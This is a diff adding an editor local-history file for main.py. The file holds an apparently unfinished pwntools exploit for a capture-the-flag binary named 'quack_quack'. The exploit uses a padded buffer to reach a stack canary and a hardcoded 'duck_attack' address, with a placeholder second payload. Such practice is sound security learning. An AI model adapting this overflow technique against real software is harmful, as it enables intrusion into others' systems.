@@ -1,0 +1,22 @@
+{
+    "sourceFile": "main.py",
+    "activeCommit": 0,
+    "commits": [
+        {
+            "activePatchIndex": 1,
+            "patches": [
+                {
+                    "date": 1742831068782,
+                    "content": "Index: \n===================================================================\n--- \n+++ \n"
+                },
+                {
+                    "date": 1742831151268,
+                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -1,17 +1,17 @@\n from pwn import *\n \n-p = process('./quack_quack')\n+p = process(\"./quack_quack\")\n duck_attack_addr = p64(0x0000000000401383)\n \n a = b\"Quack Quack \"\n-canary_address = b\"0x7fffffffd708\" \n+canary_address = b\"0x7fffffffd708\"\n # 0x64ec7212c433b400\n gdb.attach(p)\n pause()\n-i = 0\n+i = 2\n \n-payload = b\"A\" * (102 - len(a) - i) + a + b\"A\"*i\n+payload = b\"A\" * (102 - len(a) - i) + a + b\"A\" * i\n print(payload)\n \n p.recvuntil(b\"Quack the Duck!\")\n \n@@ -23,5 +23,5 @@\n payload2 = b\"IDK\"\n \n p.send(payload2)\n print(p.recvall())\n-#p.interactive()\n\\ No newline at end of file\n+# p.interactive()\n"
+                }
+            ],
+            "date": 1742831068781,
+            "name": "Commit-0",
+            "content": "from pwn import *\n\np = process('./quack_quack')\nduck_attack_addr = p64(0x0000000000401383)\n\na = b\"Quack Quack \"\ncanary_address = b\"0x7fffffffd708\" \n# 0x64ec7212c433b400\ngdb.attach(p)\npause()\ni = 0\n\npayload = b\"A\" * (102 - len(a) - i) + a + b\"A\"*i\nprint(payload)\n\np.recvuntil(b\"Quack the Duck!\")\n\np.send(payload)\n\nprint(p.recv())\nprint(p.recv())\n\npayload2 = b\"IDK\"\n\np.send(payload2)\nprint(p.recvall())\n#p.interactive()"
+        }
+    ]
+}
